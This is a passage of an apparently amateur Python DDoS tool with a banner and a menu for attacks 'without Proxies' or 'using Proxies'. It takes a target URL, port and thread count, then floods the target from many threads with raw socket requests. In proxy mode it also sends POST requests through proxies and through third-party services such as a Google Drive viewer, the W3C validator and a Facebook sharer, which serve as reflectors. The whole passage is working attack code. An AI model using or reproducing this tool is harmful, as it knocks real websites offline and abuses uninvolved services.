      bots.append('http://www.evidence.nhs.uk/search?q=')
      bots.append('https://drive.google.com/viewerng/viewer?url=')
      bots.append('http://www.shodanhq.com/search?q=')
      bots.append('http://ytmnd.com/search?q=')
      bots.append('http://itch.io/search?q=')
      bots.append('http://jobs.rbs.com/jobs/search?q=')
      bots.append('http://taginfo.openstreetmap.org/search?q=')
      bots.append('http://www.tceq.texas.gov/@@tceq-search?q=')
      bots.append('http://www.reddit.com/search?q=')
      bots.append('http://jobs.bloomberg.com/search?q=')
      bots.append('http://help.baidu.com/searchResult?keywords=')
      bots.append('http://www.evidence.nhs.uk/search?q=')
      bots.append('http://www.shodanhq.com/search?q=')
      bots.append('https://www.npmjs.com/search?q=')
      bots.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
      bots.append("http://validator.w3.org/check?uri=")
      bots.append("http://www.facebook.com/sharer/sharer.php?u=")
      bots.append('https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=')
      bots.append('http://www.ask.com/web?q=')
      bots.append('https://drive.google.com/viewerng/viewer?url=')
      return(bots)
  myBots()

  os.system('color')

  banner = (Fore.GREEN +"""

  [!] Coded  By : @fk3m on instagram
     _____ __  ______  __________  ____      __          
    / ___// / / / __ \/ ____/ __ \/ __ \____/ /___  _____
    \__ \/ / / / /_/ / __/ / /_/ / / / / __  / __ \/ ___/
   ___/ / /_/ / ____/ /___/ _, _/ /_/ / /_/ / /_/ (__  ) 
  /____/\____/_/   /_____/_/ |_/_____/\__,_/\____/____/                              
  """+ Style.RESET_ALL)
  print(banner)
  print('====================================')
  option = input(Fore.CYAN + """
  [1] Ddos Attack (without Proxies)
  [2] Ddos Attack (using Proxies)

  [+] Please Select One Option >> """+ Style.RESET_ALL)
  print('====================================')
  hostname = input(Fore.CYAN +'url: '+ Style.RESET_ALL)
  if hostname =="":
      print('[!] I didnt find this URL')
      time.sleep(3)
      sys.exit()
  elif hostname == 'amycourses.com':
      print('[!] What you Doing?, This Site for @fk3m')
      exit()
  else:
      hostname = hostname

  def GetIP():
      global hostIP
      global hostname
      try:
          hostIP = socket.gethostbyname(hostname)
      except socket.gaierror:
          print('[!] The Url is not valid ..')
          what = input(Fore.CYAN + '>> '+ Style.RESET_ALL)
          if what == 't':
              hostname = input(Fore.CYAN +'[+] Enter The Url (like : example.com) >> '+ Style.RESET_ALL)
              if hostname =="":
                  print('[!] I didnt find this URL')
                  time.sleep(3)
                  sys.exit()
              elif hostname == 'amycourses.com':
                  print('[!] What you Doing, This Site for @o_7ay')
                  exit()
              else:
                  hostname = hostname
                  hostIP = socket.gethostbyname(hostname)
          elif what == "":
              time.sleep(3)
              exit()
          else:
              time.sleep(3)
              exit()
      return(hostIP)
  GetIP()

  Port = input(Fore.CYAN +'[+] Port (Default : 80) >> '+ Style.RESET_ALL)
  if Port =="":
      Port = 80
  else:
      Port = int(Port)
  Thre = input(Fore.CYAN +'[+] Thread (Default : 140) >> '+ Style.RESET_ALL)
  if Thre == "":
      Thre = 140
  else:
      Thre = int(Thre)

  if option == "1":
      def Ddos1():
          global n
          global hostIP
          while True:
              try:
                  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                  s.connect((str(hostIP), Port))
                  s.sendto(("GET /" + str(hostIP) + " HTTP/1.1\r\n").encode('ascii'), (str(hostIP), Port))
                  s.close()
                  n +=1
                  print(Fore.GREEN + f'[{n}] Packets were sent Successfully <{hostIP}:{Port}>'+ Style.RESET_ALL)
                  pass
              except:
                  print(Fore.RED + f'[-] No Connections ! maybe Server fell <{hostIP}:{Port}>'+ Style.RESET_ALL)
                  pass
      for i in range(int(Thre)):
          t = threading.Thread(target=Ddos1)
          t.start()


  elif option == "2":
      def Secret_Ddos():
          global n
          global bots
          global hostIP
          with open('proxies.txt','r') as prox:
              broxies = prox.read().split()
          url2 = (random.choice(bots)+"http://"+hostname)
          url3 = (f'http://{hostname}')
          proxy = str(random.choice(broxies))
          proxy2 = {'http':'http://{}'.format(proxy), 
           'https':'https://{}'.format(proxy)}
          while True:
              try:
                  req = requests.post(url2,headers=head,proxies=proxy2, timeout=5)
                  re2 = requests.post(url3,headers=head,proxies=proxy2, timeout=5)
                  n +=1
                  print(Fore.GREEN + f'[{n}] Packets were sent Successfully <{hostIP}:{Port}>'+ Style.RESET_ALL)
                  pass
              except:
                  print(Fore.RED + f'[-] No Connections ! maybe Server fell <{hostIP}:{Port}>'+ Style.RESET_ALL)
                  pass
      for a in range(int(Thre)):
          t3 = threading.Thread(target=Secret_Ddos)
          t3.start()

  elif option =="":
      print("[!] Please Select 1 or 2")
      exit()

  else:
      print("[!] Please Select 1 or 2")
      exit()



